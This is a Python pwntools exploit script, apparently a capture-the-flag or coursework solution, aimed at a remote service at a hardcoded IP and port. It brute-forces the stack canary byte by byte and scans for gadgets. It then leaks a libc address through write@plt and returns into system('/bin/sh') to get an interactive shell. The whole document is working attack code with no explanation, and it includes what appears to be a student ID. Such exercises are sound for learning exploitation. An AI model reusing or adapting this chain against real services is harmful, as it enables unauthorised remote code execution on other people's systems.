from pwn import *

context.log_level = 'DEBUG' 

def getbufferflow_length():
    i = 1
    while 1:
        try:
            conn.recvuntil('darker: \n')
            key='a'*i
            conn.send(key)
            output = conn.recvline()
            if output.startswith(b'[-] You are'):
                i +=1
            else:
                conn.close()
                print('overflow length'+str(i-1))
                return 
        except EOFError:
            conn.close()
            print(i-1)
            return 

key = b'a'*16
def leak_canary():
    for i in range(256):
        tempkey = key + canary+bytes([i])
        print('tempkey'+str(tempkey))
        conn.recvuntil('darker: \n')
        conn.send(tempkey)
        output = conn.recvline()
        if output.startswith(b'[-] You are'):
            return bytes([i])
    return 0


addrList=[]
retList=[]
addr = 0x8048600

# 0x80486cf 0x80486d0 0x8048814
def stop_gadget():
    global addr
    if addr ==0x80486cf or addr == 0x80486d0 or addr == 0x8048814 or addr == 0x8048815 or addr == 0x8048840 or addr == 0x8048841 or addr == 0x804884f or addr == 0x8048851 or addr == 0x8048854 or addr == 0x8048859 or addr == 0x804885c:
        addr +=1
        return
    try:
        tempkey = key+p32(addr)
        conn.recvuntil('darker: \n')
        conn.send(tempkey)
        o = conn.recvline()
        if not o.startswith(b'[+]'):
            retList.append(hex(addr)+': '+str(o))
            print('success addr'+hex(addr))
            addrList.append(hex(addr))
            addr +=1
            return 
        else:
            addr += 1
            return
    except Exception:
        addr += 1
        return



conn = remote("47.99.80.189", 10013)

conn.recvuntil("ID:\n")
conn.sendline("3180104933")
#getbufferflow_length()
# overflow length: 16
canary=b''
for i in range(4):
    canary += leak_canary()
#canary += b'\x00'
conn.recvuntil('darker: \n')
key=key+canary+b'h'*12
conn.send(key)
#for i in range(0x300):
#while addr<0x8048960:
#    stop_gadget()
#    print(retList)
write_plt = 0x8048560
#key +=p32(write_plt)
#key += p32(0)
#key += p32(1)
#key += p32(0x8048000)
#key += p32(0x1000)
temkey = key + p32(write_plt) + p32(0) + p32(1) + p32(0x804a034) + p32(0x4)
conn.recvuntil('darker: \n')
conn.send(temkey)
op = conn.recv()
with open('./write_got','wb') as f:
    f.write(op)
write_addr = u32(op)
write_offset = 0xe56f0
sys_addr = 0x3ce10 + write_addr - write_offset
binsh_addr = 0x17b88f + write_addr - write_offset
temkey = key + p32(sys_addr) + p32(0) + p32(binsh_addr)
conn.recvuntil('darker: \n')
conn.send(temkey)

#conn.recvuntil("ID:\n")
#conn.sendline("1")
conn.interactive()   
